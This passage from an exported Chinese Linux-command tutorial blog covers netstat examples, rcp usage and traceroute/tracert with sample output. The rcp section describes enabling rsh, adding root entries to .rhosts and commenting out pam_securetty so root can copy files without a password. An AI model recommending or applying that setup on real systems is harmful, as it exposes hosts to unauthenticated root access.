MSS Window irtt Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# 实例12：列出所有 tcp 端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -at &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# netstat -atActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:smux *:* LISTEN tcp 0 0 *:svn *:* LISTEN tcp 0 0 *:ssh *:* LISTEN tcp 0 284 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED [root@localhost ~]# 实例13：统计机器中网络连接各个状态个数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -a | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# netstat -a | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;'ESTABLISHED 1LISTEN 3[root@localhost ~]# 实例14：把状态全都取出来后使用uniq -c统计后再进行排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -nat |awk '&#123;print $6&#125;'|sort|uniq -c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@andy ~]# netstat -nat |awk '&#123;print $6&#125;'|sort|uniq -c 14 CLOSE_WAIT 1 established) 578 ESTABLISHED 1 Foreign 43 LISTEN 5 TIME_WAIT[root@andy ~]# netstat -nat |awk '&#123;print $6&#125;'|sort|uniq -c|sort -rn 576 ESTABLISHED 43 LISTEN 14 CLOSE_WAIT 5 TIME_WAIT 1 Foreign 1 established)[root@andy ~]# 实例15：查看连接某服务端口最多的的IP地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -nat | grep "192.168.120.20:16067" |awk '&#123;print $5&#125;'|awk -F: '&#123;print $4&#125;'|sort|uniq -c|sort -nr|head -20 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@andy ~]# netstat -nat | grep "192.168.120.20:16067" |awk '&#123;print $5&#125;'|awk -F: '&#123;print $4&#125;'|sort|uniq -c|sort -nr|head -20 8 10.2.1.68 7 192.168.119.13 6 192.168.119.201 6 192.168.119.20 6 192.168.119.10 4 10.2.1.199 3 10.2.1.207 2 192.168.120.20 2 192.168.120.15 2 192.168.119.197 2 192.168.119.11 2 10.2.1.206 2 10.2.1.203 2 10.2.1.189 2 10.2.1.173 1 192.168.120.18 1 192.168.119.19 1 10.2.2.227 1 10.2.2.138 1 10.2.1.208[root@andy ~]# 实例16：找出程序运行的端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -ap | grep ssh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@andy ~]# netstat -ap | grep sshtcp 0 0 *:ssh *:* LISTEN 2570/sshd tcp 0 0 ::ffff:192.168.120.206:ssh ::ffff:10.2.1.205:54508 ESTABLISHED 13883/14 tcp 0 0 ::ffff:192.168.120.206:ssh ::ffff:10.2.0.68:62886 ESTABLISHED 20900/6 tcp 0 0 ::ffff:192.168.120.206:ssh ::ffff:10.2.2.131:52730 ESTABLISHED 20285/sshd: root@no unix 2 [ ACC ] STREAM LISTENING 194494461 20900/6 /tmp/ssh-cXIJj20900/agent.20900unix 3 [ ] STREAM CONNECTED 194307443 20285/sshd: root@no unix 3 [ ] STREAM CONNECTED 194307441 20285/sshd: root@no [root@andy ~]# 实例17：在 netstat 输出中显示 PID 和进程名称&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -pt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# netstat -ptActive Internet connections (w/o servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 248 192.168.120.204:ssh 10.2.0.68:62420 ESTABLISHED 15725/0 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netstat -p 可以与其它开关一起使用，就可以添加 “PID/进程名称” 到 netstat 输出中，这样 debugging 的时候可以很方便的发现特定端口运行的程序。 实例18：找出运行在指定端口的进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1netstat -anpt | grep ':16064' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@andy ~]# netstat -anpt | grep ':16064'tcp 0 0 :::16064 :::* LISTEN 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.201:6462 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.20:26341 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.20:32208 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:192.168.119.20:32207 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:51303 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:51302 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50020 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50019 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:56155 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50681 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:50680 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:52136 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:56989 ESTABLISHED 24594/java tcp 0 0 ::ffff:192.168.120.20:16064 ::ffff:10.2.1.68:56988 ESTABLISHED 24594/java [root@andy ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行在端口16064的进程id为24596，再通过ps命令就可以找到具体的应用程序了。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rcp]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F61.%20Linux%20%E5%91%BD%E4%BB%A4-%20rcp%2F</url>
    <content type="text"><![CDATA[Linux 命令- rcp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rcp代表“remote file copy”（远程文件拷贝）。该命令用于在计算机之间拷贝文件。rcp命令有两种格式。第一种格式用于文件到文件的拷贝；第二种格式用于把文件或目录拷贝到另一个目录中。 1．命令格式1rcp [参数] [源文件] [目标文件] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rcp命令用在远端复制文件或目录，如同时指定两个以上的文件或目录，且最后的目的地是一个已经存在的目录，则它会把前面指定的所有文件或目录复制到该目录中。 3．命令参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;各选项含义： -r 递归地把源目录中的所有内容拷贝到目的目录中。要使用这个选项，目的必须是一个目录。 -p 试图保留源文件的修改时间和模式，忽略umask。 -k 请求rcp获得在指定区域内的远程主机的Kerberos 许可，而不是获得由krb_relmofhost⑶确定的远程主机区域内的远程主机的Kerberos许可。 -x 为传送的所有数据打开DES加密。这会影响响应时间和CPU利用率，但是可以提高安全性。如果在文件名中指定的路径不是完整的路径名，那么这个路径被解释为相对远程机上同名用户的主目录。如果没有给出远程用户名，就使用当前用户名。如果远程机上的路径包含特殊shell字符，需要用反斜线（\\）、双引号（”）或单引号（’）括起来，使所有的shell元字符都能被远程地解释。需要说明的是，rcp不提示输入口令，它通过rsh命令来执行拷贝。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;directory 每个文件或目录参数既可以是远程文件名也可以是本地文件名。远程文件名具有如下形式：rname@rhost：path，其中rname是远程用户名，rhost是远程计算机名，path是这个文件的路径。 4．使用实例要使用 rcp，需要具备以下条件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果系统中有 /etc/hosts 文件，系统管理员应确保该文件包含要与之进行通信的远程主机的项。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/hosts 文件中有一行文字，其中包含每个远程系统的以下信息： 1internet_address official_name alias &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 19.186.10.*** webserver1.com.58.webserver &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.rhosts 文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;.rhosts 文件位于远程系统的主目录下，其中包含本地系统的名称和本地登录名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，远程系统的 .rhosts 文件中的项可能是： 1webserver1 root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，webserver1 是本地系统的名称，root 是本地登录名。这样，webserver1 上的 root 即可在包含 .rhosts 文件的远程系统中来回复制文件。 配置过程:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只对root用户生效 在双方root用户根目录下建立.rhosts文件,并将双方的hostname加进去.在此之前应在双方的 /etc/hosts文件中加入对方的IP和hostname 把rsh服务启动起来,redhat默认是不启动的。方法：用执行ntsysv命令,在rsh选项前用空格键选中,确定退出。然后执行：service xinetd restart即可。 到/etc/pam.d/目录下,把rsh文件中的auth required /lib/security/pam_securetty.so一行用“#”注释掉即可。（只有注释掉这一行，才能用root用户登录） 命令使用:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件复制到远程系统要将本地系统中的文件复制到远程系统，请使用以下命令： 1rcplocal_fileremote_hostname:remote_fileEnter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，如果当前目录下没有 local_file，则除本地文件名外，还需要提供相对路径（自当前目录开始）或绝对路径名（自 / 开始）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;仅当希望将 remote_hostname 上的 remote_file 放到其他目录（远程主目录除外）下时，才需要为其指定完整的（绝对）路径。 使用实例1:将当前目录下的 test1 复制到名为 webserver1的远程系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp test1 webserver1:/home/root/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这种情况下，test1 被复制到远程子目录 test3下，名称仍为 test1 。如果仅提供了远程主机名，rcp 将把 test1 复制到远程主目录下，名称仍为 test1 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还可以在目的目录中包含文件名。例如，将文件复制到名为 webserver1的系统中： 1rcp test1 webserver1:/home/root/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这种情况下，将 test1 复制到远程目录root 下并将其命名为 test3。 使用实例2：从远程系统复制文件：要将远程系统中的文件复制到本地目录下&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp remote_hostname:remote_file local_fileEnter 使用实例:3:将远程系统 webserver1中的 test2 复制到当前目录：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp webserver1:/home/root/test2 .Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 (.) 是“当前目录”的简写形式。在这种情况下，远程目录中的 test2 被复制到当前目录下，名称仍为 test2 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望用新名称复制文件，请提供目标文件名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望将 test2 复制到本地系统中的其他目录下，请使用以下绝对或相对路径名： 1rcp webserver1:/home/root/test2 otherdir/ Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者，如果希望用其他文件名将文件复制到其他目录下： 1rcp webserver1:/home/root/test2 otherdir/otherfile Enter 使用实例4：将目录复制到远程系统：要将本地目录及其文件和子目录复制到远程系统，请同时使用 rcp 和 -r（递归）选项。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp –r local_dir remote_hostname:remote_dir Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果当前目录下没有 local_dir，则除本地目录名外，还需要提供相对路径名（自当前目录开始）或绝对路径名（自 / 顶级目录开始）。另外，如果主目录下没有 remote_dir，则 remote_dir 将需要一个相对路径（自主目录开始）或绝对路径（自 / 开始）。 使用实例5:要将名为 work 的子目录完整地复制到 webserver1远程计算机中的主目录下名为 products 的目录，请键入以下内容：1rcp –r work webserver1:/home/root/products Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此命令在 webserver1:/home/root/products 下创建名为 work 的目录及其全部内容（假定 /home/root/products 已存在于 webserver1中）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本示例假定用户处于包含 work 的本地目录下。否则，必须提供该目录的相对或绝对路径，如 /home/root/work。 使用实例6：从远程系统复制目录：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要将远程目录及其所有文件和子目录复制到本地目录，请在以下语法中使用 rcp 和 -r（递归）选项。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rcp –r remote_hostname:remote_dir local_dir Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要将名为 work 的远程目录复制到当前目录，请键入以下内容： 1rcp –r webserver1:/home/root/work .Enter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;点 (.) 表示当前目录。将在此目录下创建 work 目录。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- traceroute]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F57.%20Linux%20%E5%91%BD%E4%BB%A4-%20traceroute%2F</url>
    <content type="text"><![CDATA[Linux 命令- traceroute&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过traceroute我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。linux系统中，我们称之为traceroute,在MS Windows中为tracert。 traceroute通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备traceroute要测3次。输出结果中包括每次测试的时间(ms)和设备的名称（如有的话）及其IP地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在大多数情况下，我们会在linux主机系统下，直接执行命令行： 1traceroute hostname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而在Windows系统下是执行tracert的命令： 1tracert hostname 1.命令格式1traceroute [参数] [主机] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体参数格式： 1traceroute [-dFlnrvx][-f&lt;存活数值&gt;][-g&lt;网关&gt;...][-i&lt;网络界面&gt;][-m&lt;存活数值&gt;][-p&lt;通信端口&gt;][-s&lt;来源地址&gt;][-t&lt;服务类型&gt;][-w&lt;超时秒数&gt;][主机名称或IP地址][数据包大小] 3.命令参数 -d 使用Socket层级的排错功能。 -f 设置第一个检测数据包的存活数值TTL的大小。 -F 设置勿离断位。 -g 设置来源路由网关，最多可设置8个。 -i 使用指定的网络界面送出数据包。 -I 使用ICMP回应取代UDP资料信息。 -m 设置检测数据包的最大存活数值TTL的大小。 -n 直接使用IP地址而非主机名称。 -p 设置UDP传输协议的通信端口。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s 设置本地主机送出数据包的IP地址。 -t 设置检测数据包的TOS数值。 -v 详细显示指令的执行过程。 -w 设置等待远端主机回报的时间。 -x 开启或关闭数据包的正确性检验。 4.使用实例实例1：traceroute 用法简单、最常用的用法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 192.168.74.2 (192.168.74.2) 2.606 ms 2.771 ms 2.950 ms 2 211.151.56.57 (211.151.56.57) 0.596 ms 0.598 ms 0.591 ms 3 211.151.227.206 (211.151.227.206) 0.546 ms 0.544 ms 0.538 ms 4 210.77.139.145 (210.77.139.145) 0.710 ms 0.748 ms 0.801 ms 5 202.106.42.101 (202.106.42.101) 6.759 ms 6.945 ms 7.107 ms 6 61.148.154.97 (61.148.154.97) 718.908 ms * bt-228-025.bta.net.cn (202.106.228.25) 5.177 ms 7 124.65.58.213 (124.65.58.213) 4.343 ms 4.336 ms 4.367 ms 8 202.106.35.190 (202.106.35.190) 1.795 ms 61.148.156.138 (61.148.156.138) 1.899 ms 1.951 ms 9 * * *30 * * *[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;记录按序列号从1开始，每个纪录就是一跳 ，每跳表示一个网关，我们看到每行有三个时间，单位是 ms，其实就是-q的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果您用 traceroute -q 4 www.58.com ，表示向每个网关发送4个数据包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时我们traceroute 一台主机时，会看到有一些行是以星号表示的。出现这样的情况，可能是防火墙封掉了ICMP的返回信息，所以我们得不到什么相关的数据包返回数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时我们在某一网关处延时比较长，有可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台DNS出现问题时，不能解析主机名、域名时，也会 有延时长的现象；您可以加-n 参数来避免DNS解析，以IP格式输出数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果在局域网中的不同网段之间，我们可以通过traceroute 来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute 追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。 实例2：跳数设置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -m 10 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute -m 10 www.baidu.comtraceroute to www.baidu.com (61.135.169.105), 10 hops max, 40 byte packets 1 192.168.74.2 (192.168.74.2) 1.534 ms 1.775 ms 1.961 ms 2 211.151.56.1 (211.151.56.1) 0.508 ms 0.514 ms 0.507 ms 3 211.151.227.206 (211.151.227.206) 0.571 ms 0.558 ms 0.550 ms 4 210.77.139.145 (210.77.139.145) 0.708 ms 0.729 ms 0.785 ms 5 202.106.42.101 (202.106.42.101) 7.978 ms 8.155 ms 8.311 ms 6 bt-228-037.bta.net.cn (202.106.228.37) 772.460 ms bt-228-025.bta.net.cn (202.106.228.25) 2.152 ms 61.148.154.97 (61.148.154.97) 772.107 ms 7 124.65.58.221 (124.65.58.221) 4.875 ms 61.148.146.29 (61.148.146.29) 2.124 ms 124.65.58.221 (124.65.58.221) 4.854 ms 8 123.126.6.198 (123.126.6.198) 2.944 ms 61.148.156.6 (61.148.156.6) 3.505 ms 123.126.6.198 (123.126.6.198) 2.885 ms 9 * * *10 * * *[root@localhost ~]# 实例3：显示IP地址，不查主机名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -n www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425[root@localhost ~]# traceroute -n www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 211.151.74.2 5.430 ms 5.636 ms 5.802 ms 2 211.151.56.57 0.627 ms 0.625 ms 0.617 ms 3 211.151.227.206 0.575 ms 0.584 ms 0.576 ms 4 210.77.139.145 0.703 ms 0.754 ms 0.806 ms 5 202.106.42.101 23.683 ms 23.869 ms 23.998 ms 6 202.106.228.37 247.101 ms * * 7 61.148.146.29 5.256 ms 124.65.58.213 4.386 ms 4.373 ms 8 202.106.35.190 1.610 ms 61.148.156.138 1.786 ms 61.148.3.34 2.089 ms 9 * * *30 * * *[root@localhost ~]# traceroute www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 4.671 ms 4.865 ms 5.055 ms 2 211.151.56.57 (211.151.56.57) 0.619 ms 0.618 ms 0.612 ms 3 211.151.227.206 (211.151.227.206) 0.620 ms 0.642 ms 0.636 ms 4 210.77.139.145 (210.77.139.145) 0.720 ms 0.772 ms 0.816 ms 5 202.106.42.101 (202.106.42.101) 7.667 ms 7.910 ms 8.012 ms 6 bt-228-025.bta.net.cn (202.106.228.25) 2.965 ms 2.440 ms 61.148.154.97 (61.148.154.97) 431.337 ms 7 124.65.58.213 (124.65.58.213) 5.134 ms 5.124 ms 5.044 ms 8 202.106.35.190 (202.106.35.190) 1.917 ms 2.052 ms 2.059 ms 9 * * *30 * * *[root@localhost ~]# 实例4：探测包使用的基本UDP端口设置6888&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -p 6888 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# traceroute -p 6888 www.baidu.comtraceroute to www.baidu.com (220.181.111.147), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 4.927 ms 5.121 ms 5.298 ms 2 211.151.56.1 (211.151.56.1) 0.500 ms 0.499 ms 0.509 ms 3 211.151.224.90 (211.151.224.90) 0.637 ms 0.631 ms 0.641 ms 4 * * * 5 220.181.70.98 (220.181.70.98) 5.050 ms 5.313 ms 5.596 ms 6 220.181.17.94 (220.181.17.94) 1.665 ms !X * *[root@localhost ~]# 实例5：把探测包的个数设置为值4&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -q 4 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute -q 4 www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 40.633 ms 40.819 ms 41.004 ms 41.188 ms 2 211.151.56.57 (211.151.56.57) 0.637 ms 0.633 ms 0.627 ms 0.619 ms 3 211.151.227.206 (211.151.227.206) 0.505 ms 0.580 ms 0.571 ms 0.569 ms 4 210.77.139.145 (210.77.139.145) 0.753 ms 0.800 ms 0.853 ms 0.904 ms 5 202.106.42.101 (202.106.42.101) 7.449 ms 7.543 ms 7.738 ms 7.893 ms 6 61.148.154.97 (61.148.154.97) 316.817 ms bt-228-025.bta.net.cn (202.106.228.25) 3.695 ms 3.672 ms * 7 124.65.58.213 (124.65.58.213) 3.056 ms 2.993 ms 2.960 ms 61.148.146.29 (61.148.146.29) 2.837 ms 8 61.148.3.34 (61.148.3.34) 2.179 ms 2.295 ms 2.442 ms 202.106.35.190 (202.106.35.190) 7.136 ms 9 * * * *30 * * * *[root@localhost ~]# 实例6：绕过正常的路由表，直接发送到网络相连的主机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -r www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# traceroute -r www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packetsconnect: 网络不可达[root@localhost ~]# 实例7：把对外发探测包的等待响应时间设置为3秒&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -w 3 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute -w 3 www.baidu.comtraceroute to www.baidu.com (61.135.169.105), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 2.306 ms 2.469 ms 2.650 ms 2 211.151.56.1 (211.151.56.1) 0.621 ms 0.613 ms 0.603 ms 3 211.151.227.206 (211.151.227.206) 0.557 ms 0.560 ms 0.552 ms 4 210.77.139.145 (210.77.139.145) 0.708 ms 0.761 ms 0.817 ms 5 202.106.42.101 (202.106.42.101) 7.520 ms 7.774 ms 7.902 ms 6 bt-228-025.bta.net.cn (202.106.228.25) 2.890 ms 2.369 ms 61.148.154.97 (61.148.154.97) 471.961 ms 7 124.65.58.221 (124.65.58.221) 4.490 ms 4.483 ms 4.472 ms 8 123.126.6.198 (123.126.6.198) 2.948 ms 61.148.156.6 (61.148.156.6) 7.688 ms 7.756 ms 9 * * *30 * * *[root@localhost ~]# Traceroute的工作原理：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute最简单的基本用法是：traceroute hostname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute程序的设计是利用ICMP及IP header的TTL（Time To Live）栏位（field）。首先，traceroute送出一个TTL是1的IP datagram（其实，每次送出的为3个40字节的包，包括源地址，目的地址和包发出的时间标签）到目的地，当路径上的第一个路由器（router）收到这个datagram时，它将TTL减1。此时，TTL变为0了，所以该路由器会将此datagram丢掉，并送回一个「ICMP time exceeded」消息（包括发IP包的源地址，IP包的所有内容及路由器的IP地址），traceroute 收到这个消息后，便知道这个路由器存在于这个路径上，接着traceroute 再送出另一个TTL是2 的datagram，发现第2 个路由器…… traceroute 每次将送出的datagram的TTL 加1来发现另一个路由器，这个重复的动作一直持续到某个datagram 抵达目的地。当datagram到达目的地后，该主机并不会送回ICMP time exceeded消息，因为它已是目的地了，那么traceroute如何得知目的地到达了呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute在送出UDP datagrams到目的地时，它所选择送达的port number 是一个一般应用程序都不会用的号码（30000 以上），所以当此UDP datagram 到达目的地后该主机会送回一个「ICMP port unreachable」的消息，而当traceroute 收到这个消息时，便知道目的地已经到达了。所以traceroute 在Server端也是没有所谓的Daemon 程式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute提取发 ICMP TTL到期消息设备的IP地址并作域名解析。每次 ，Traceroute都打印出一系列数据,包括所经过的路由设备的域名及 IP地址,三个包每次来回所花时间。 windows之tracert:格式：1tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name 参数说明：1tracert [-d] [-h maximum_hops] [-j computer-list] [-w timeout] target_name &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该诊断实用程序通过向目的地发送具有不同生存时间 (TL) 的 Internet 控制信息协议 (CMP) 回应报文，以确定至目的地的路由。路径上的每个路由器都要在转发该 ICMP 回应报文之前将其 TTL 值至少减 1，因此 TTL 是有效的跳转计数。当报文的 TTL 值减少到 0 时，路由器向源系统发回 ICMP 超时信息。通过发送 TTL 为 1 的第一个回应报文并且在随后的发送中每次将 TTL 值加 1，直到目标响应或达到最大 TTL 值，Tracert 可以确定路由。通过检查中间路由器发发回的 ICMP 超时 (ime Exceeded) 信息，可以确定路由器。注意，有些路由器“安静”地丢弃生存时间 (TLS) 过期的报文并且对 tracert 无效。 参数： -d 指定不对计算机名解析地址。 -h maximum_hops 指定查找目标的跳转的最大数目。 -jcomputer-list 指定在 computer-list 中松散源路由。 -w timeout 等待由 timeout 对每个应答指定的毫秒数。 target_name 目标计算机的名称。 实例：1234567891011121314151617181920212223242526272829C:\Users\Administrator&gt;tracert www.58.comTracing route to www.58.com [221.187.111.30]over a maximum of 30 hops: 1 1 ms 1 ms 1 ms 10.58.156.1 2 1 ms &lt;1 ms &lt;1 ms 10.10.10.1 3 1 ms 1 ms 1 ms 211.103.193.129 4 2 ms 2 ms 2 ms 10.255.109.129 5 1 ms 1 ms 3 ms 124.205.98.205 6 2 ms 2 ms 2 ms 124.205.98.253 7 2 ms 6 ms 1 ms 202.99.1.125 8 5 ms 6 ms 5 ms 118.186.0.113 9 207 ms * * 118.186.0.106 10 8 ms 6 ms 11 ms 124.238.226.201 11 6 ms 7 ms 6 ms 219.148.19.177 12 12 ms 12 ms 16 ms 219.148.18.117 13 14 ms 17 ms 16 ms 219.148.19.125 14 13 ms 13 ms 12 ms 202.97.80.113 15 * * * Request timed out. 16 12 ms 12 ms 17 ms bj141-147-82.bjtelecom.net [219.141.147.82] 17 13 ms 13 ms 12 ms 202.97.48.2 18 * * * Request timed out. 19 14 ms 14 ms 12 ms 221.187.224.85 20 15 ms 13 ms 12 ms 221.187.104.2 21 * * * Request timed out. 22 15 ms 17 ms 18 ms 221.187.111.30Trace complete.]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- scp]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F62.%20Linux%20%E5%91%BD%E4%BB%A4-%20scp%2F</url>
